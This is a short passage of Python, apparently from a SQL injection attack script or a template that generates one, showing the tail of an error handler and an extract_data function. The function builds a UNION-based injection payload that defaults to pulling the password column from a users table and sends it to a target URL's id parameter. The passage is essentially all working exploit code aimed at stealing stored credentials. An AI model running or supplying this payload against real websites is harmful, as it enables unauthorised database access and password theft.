        except Exception as e:
            print(f"[-] Error: {{e}}")

def extract_data(url, param='id', table='users', column='password'):
    '''Extract data using UNION-based SQL injection'''
    payload = f"' UNION SELECT {{column}} FROM {{table}}--"
    return requests.get(url, params={{param: payload}}).text

